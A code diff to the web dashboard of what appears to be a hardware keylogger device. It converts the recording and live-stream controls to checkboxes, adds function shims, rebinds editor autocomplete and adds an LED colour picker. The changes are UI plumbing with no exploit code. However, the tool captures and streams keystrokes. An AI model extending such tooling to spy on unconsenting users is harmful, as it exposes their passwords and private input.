@@ -597,11 +597,16 @@
 
                 <pre id="kl_live" style="background:#000; color:#4CAF50; padding:12px; border-radius:8px; min-height:260px; max-height:440px; overflow:auto; font:13px/1.5 ui-monospace,Menlo,monospace; white-space:pre-wrap; word-break:break-all; margin:0 0 14px;">[waiting for keys from the hub…]</pre>
 
-                <div class="flex-row" style="gap:10px; flex-wrap:wrap;">
-                    <button class="control-btn" onclick="klRec(true)">Start Recording</button>
-                    <button class="control-btn" onclick="klRec(false)">Stop Recording</button>
-                    <button class="control-btn" onclick="klLive(true)">Start Live Stream</button>
-                    <button class="control-btn" onclick="klLive(false)">Stop Live Stream</button>
+                <div class="flex-row" style="gap:14px; flex-wrap:wrap; align-items:center;">
+                    <label class="flex-row" style="gap:8px;">
+                        <input type="checkbox" id="kl_sw_rec" onchange="klRec(this.checked)">
+                        <span>Recording</span>
+                    </label>
+                    <label class="flex-row" style="gap:8px;">
+                        <input type="checkbox" id="kl_sw_live" onchange="klLive(this.checked)">
+                        <span>Live stream</span>
+                    </label>
+                    <span style="flex:1"></span>
                     <button class="control-btn" onclick="klDownload()">Download log</button>
                     <button class="control-btn" onclick="klClearView()">Clear view</button>
                     <button class="control-btn danger" onclick="klDelete()">Delete log</button>
@@ -637,6 +642,8 @@
                             setPill($('kl_p_mouse'),j.mouse?'ok':'warn','Mouse: '+(j.mouse?'connected':'disconnected'));
                             setPill($('kl_p_pc'),   j.pc?'ok':'warn',   'PC: '+(j.pc?'connected':'not mounted'));
                             setPill($('kl_p_rec'),  j.recording?'ok':'warn','Recording: '+(j.recording?'on':'off'));
+                            if ($('kl_sw_rec'))  $('kl_sw_rec').checked  = !!j.recording;
+                            if ($('kl_sw_live')) $('kl_sw_live').checked = !!j.live;
                             if (typeof j.layout==='number') $('kl_layout').value=j.layout;
                             if (typeof j.heldEnabled==='boolean') $('kl_held').checked=j.heldEnabled;
                         }).catch(()=>{});
@@ -723,5 +730,84 @@
     </div>
 
     <script src="script.js?v=4.36"></script>
+
+    <!-- Port-specific patches loaded AFTER the reference script.js so we can:
+         (a) provide no-op shims for functions the reference references at
+             tab-switch time but only defines when running on the S3
+             (refreshDesigns, refreshExtensions, refreshBoot, refreshFileBrowser,
+             ...); missing these throws "ReferenceError: X is not defined"
+             the moment the tab is clicked.
+         (b) rebind autocomplete: reference uses Enter to accept the highlighted
+             completion, which fights the "Enter = new line in the editor"
+             habit. Rebind to Tab.
+         (c) inject a small LED color picker into the Settings > Hardware LED
+             row (the reference UI only exposes an on/off toggle). -->
+    <script>
+    (function(){
+        // (a) safe no-op shims for reference-only helpers
+        ['refreshDesigns','refreshExtensions','refreshBoot','refreshFileBrowser',
+         'refreshFiles','refreshTasks','refreshWifiStatus','refreshWiki']
+         .forEach(n => { if (typeof window[n] !== 'function') window[n] = function(){}; });
+
+        // (b) autocomplete: Tab accepts, Enter inserts a newline.
+        // Reference wires autocomplete to Enter on scriptArea. Override by
+        // capturing the keydown in the capture phase and swapping semantics.
+        window.addEventListener('load', () => {
+            const sa = document.getElementById('scriptArea');
+            if (!sa) return;
+            sa.addEventListener('keydown', e => {
+                const popup = document.querySelector('.autocomplete-popup, #autocompletePopup, .ac-popup');
+                const isOpen = popup && getComputedStyle(popup).display !== 'none';
+                if (!isOpen) return;
+                if (e.key === 'Tab') {
+                    e.preventDefault();
+                    // synth an Enter and let the existing accept-on-Enter code run
+                    const k = new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', bubbles: true });
+                    e.target.dispatchEvent(k);
+                } else if (e.key === 'Enter') {
+                    // Let Enter fall through as newline in editor — DO NOT preventDefault.
+                    e.stopImmediatePropagation();
+                }
+            }, true);   // capture so we run before the reference handler
+        });
+
+        // (c) LED color picker — appended to the Hardware LED row in
+        // Settings. Talks to /api/led-mode?m=1..4 (1=GREEN, 2=KEYFLASH,
+        // 3=RED, 4=BLUE). Real backend flips the same s_led_mode the
+        // keylog dashboard already owns, so switching from either UI
+        // stays in sync.
+        window.addEventListener('load', () => {
+            const toggle = document.getElementById('ledToggle');
+            const row = toggle ? toggle.closest('.setting-row, .row, div') : null;
+            if (!row) return;
+            if (document.getElementById('ledColorPicker')) return;
+            const wrap = document.createElement('div');
+            wrap.id = 'ledColorPicker';
+            wrap.style.cssText = 'display:flex; gap:8px; margin-top:8px; flex-wrap:wrap; align-items:center;';
+            wrap.innerHTML =
+                '<span style="color:var(--text-muted);font-size:13px">Color:</span>' +
+                '<button class="control-btn" data-m="1" style="background:#4CAF50;color:#000">Green</button>' +
+                '<button class="control-btn" data-m="3" style="background:#f44336;color:#fff">Red</button>' +
+                '<button class="control-btn" data-m="4" style="background:#2196F3;color:#fff">Blue</button>' +
+                '<button class="control-btn" data-m="2">Key-flash</button>' +
+                '<span id="ledModeLabel" style="color:var(--text-muted);font-size:13px;margin-left:8px">mode: —</span>';
+            row.appendChild(wrap);
+            wrap.querySelectorAll('button[data-m]').forEach(b => {
+                b.addEventListener('click', () => {
+                    fetch('/api/led-mode?m=' + b.dataset.m, {method:'POST'})
+                      .then(r=>r.json()).then(j=>{
+                          const lbl = document.getElementById('ledModeLabel');
+                          if (lbl) lbl.textContent = 'mode: ' + j.ledMode + (j.ledEnabled?'':' (off)');
+                      });
+                });
+            });
+            // Prime label from /api/stats
+            fetch('/api/stats').then(r=>r.json()).then(d => {
+                const lbl = document.getElementById('ledModeLabel');
+                if (lbl && typeof d.ledMode === 'number') lbl.textContent = 'mode: ' + d.ledMode + (d.ledEnabled?'':' (off)');
+            }).catch(()=>{});
+        });
+    })();
+    </script>
 </body>
 </html>
